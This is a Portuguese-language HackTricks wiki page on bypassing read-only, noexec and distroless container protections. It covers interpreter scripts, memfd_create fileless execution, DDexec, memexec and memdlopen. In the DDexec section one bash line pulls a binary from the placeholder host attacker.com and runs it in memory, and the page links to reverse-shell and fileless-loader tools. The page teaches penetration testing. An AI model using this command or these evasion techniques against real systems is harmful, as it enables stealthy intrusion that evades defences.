# Bypass de proteções do sistema de arquivos: somente leitura / sem execução / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Vídeos

Nos vídeos a seguir, você encontra explicações mais detalhadas sobre as técnicas mencionadas nesta página:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## Cenário somente leitura / sem execução

Em um container, você pode montar o sistema de arquivos raiz como somente leitura definindo **`readOnlyRootFilesystem: true`** no contexto de segurança.<sup>[[3]](#references)</sup> Por exemplo:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Um sistema de arquivos raiz somente leitura não torna somente leitura os volumes montados separadamente. O Docker trata **`/dev/shm`** como uma montagem IPC, enquanto opções do tmpfs, como `rw` e `noexec`, são escolhas de configuração do runtime; inspecione as opções de montagem do container alvo antes de confiar em qualquer um desses comportamentos.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Do ponto de vista de red team, essa combinação pode dificultar o download e a execução de binários que ainda não estejam disponíveis (por exemplo, backdoors ou ferramentas de enumeração).<sup>[[4]](#references)[[5]](#references)</sup>

## Bypass mais simples: scripts

Uma montagem `noexec` bloqueia a execução direta de binários nessa montagem, mas um interpretador ainda pode ler e interpretar um script. Portanto, se `sh` ou `python` estiver disponível, você pode executar um script de shell ou Python por meio desse interpretador.<sup>[[5]](#references)</sup>

Isso não ajuda quando a própria ferramenta necessária é um binário.<sup>[[5]](#references)</sup>

## Bypasses de memória

Quando a execução direta a partir de um caminho montado é bloqueada, uma opção é carregar o ELF na memória e executá-lo por meio de um caminho em memória. Isso evita a verificação `noexec` nessa montagem, mas não elimina outros controles do kernel, de permissões ou de políticas.<sup>[[5]](#references)[[6]](#references)</sup>

### Bypass com FD + syscall exec

Se um runtime de scripting puder acessar a interface Linux relevante, ele pode criar um descritor de arquivo anônimo, respaldado por RAM, usando **`memfd_create(2)`**, gravar nele os bytes do ELF e usar um caminho de execução baseado em FD. O projeto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) gera código Python, Perl ou Ruby compactado e codificado em base64 para esse fluxo de trabalho.<sup>[[6]](#references)[[7]](#references)</sup>

Atualmente, o projeto documenta alvos Python, Perl e Ruby; PHP ou Node exigem uma técnica específica para o runtime ou uma extensão diferente. Portanto, a ausência de um gerador para uma linguagem não significa que a execução em memória seja impossível.<sup>[[6]](#references)[[12]](#references)</sup>

Consulte [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md) para uma visão mais ampla da execução de arquivos anônimos, padrões relacionados de staging e coleta para detecção e análise forense.

> [!WARNING]
> Um executável comum gravado em **`/dev/shm`** continua sujeito à configuração **`noexec`** dessa montagem; simplesmente abri-lo por meio de um descritor de arquivo comum não altera a política da montagem.<sup>[[5]](#references)</sup>
>
> O método exato de execução em memória também depende do runtime, da arquitetura, do kernel e das permissões disponíveis.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) grava um stager e um loader no processo do shell em execução por meio de **`/proc/self/mem`** e, em seguida, transfere o controle para esse código.<sup>[[8]](#references)</sup>

Isso permite que o processo carregue um binário fornecido sem antes colocá-lo em um sistema de arquivos executável.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** pode carregar e **executar** shellcode ou um binário a partir da **memória**.<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

Para obter mais informações sobre esta técnica, consulte o Github ou:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) é uma implementação daemonizada do DDexec. Seu daemon escuta solicitações com argumentos e bytes brutos do programa, cria um processo filho para carregar e executar cada programa e mantém o processo pai como servidor.<sup>[[9]](#references)</sup>

O repositório inclui um exemplo de uso do **memexec para executar binários a partir de um reverse shell em PHP** em [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Com finalidade semelhante à do DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) é uma implementação fileless de `dlopen()` para um objeto compartilhado ou programa. O README documenta atualmente suporte a ARM64, então verifique a arquitetura do alvo antes de usá-lo.<sup>[[10]](#references)</sup>

## Distroless Bypass

Para uma explicação dedicada sobre **o que distroless realmente significa**, quando é útil, quando não é e como altera as táticas de post-exploitation em containers, consulte:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### O que é distroless

Imagens distroless contêm apenas o aplicativo e suas dependências de runtime; as imagens oficiais omitem gerenciadores de pacotes, shells e outros programas esperados em uma distribuição Linux padrão.<sup>[[11]](#references)</sup>

Manter na imagem de runtime apenas essas dependências reduz o software presente em produção e a quantidade que precisa ser verificada e monitorada.<sup>[[11]](#references)</sup>

### Reverse Shell

Em um container distroless, talvez **não encontre `sh` ou `bash`** para obter um shell comum, nem utilitários comuns como `ls`, `whoami` ou `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Portanto, um reverse shell comum baseado em shell ou uma enumeração baseada em utilitários pode não funcionar.<sup>[[11]](#references)</sup>

Se o aplicativo comprometido incluir um runtime de linguagem (por exemplo, Python para um aplicativo Flask ou Node.js para um aplicativo Node), um RCE ainda poderá usar esse runtime para estabelecer um canal de comandos e inspecionar o sistema por meio de suas APIs.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Use a linguagem de script disponível para **enumerar o sistema** por meio dos recursos dessa linguagem.<sup>[[12]](#references)</sup>

Se não houver proteções **read-only/no-exec**, um canal de comandos poderá gravar binários em um ponto de montagem gravável e executável e executá-los; verifique primeiro as opções de montagem e as permissões.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Quando essas proteções estiverem presentes, use as **técnicas de execução em memória acima**, quando o runtime, o kernel e as permissões permitirem.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Você pode encontrar **exemplos** de exploração de vulnerabilidades de RCE para obter **reverse shells** com linguagens de script e executar binários a partir da memória em [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Explorando a manipulação de memória do Linux para stealth e evasão](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Intrusões furtivas com DDexec-ng e dlopen() em memória - Trilha HackTricks 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Configurar um contexto de segurança para um Pod ou Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - página do manual do Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - página do manual do Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
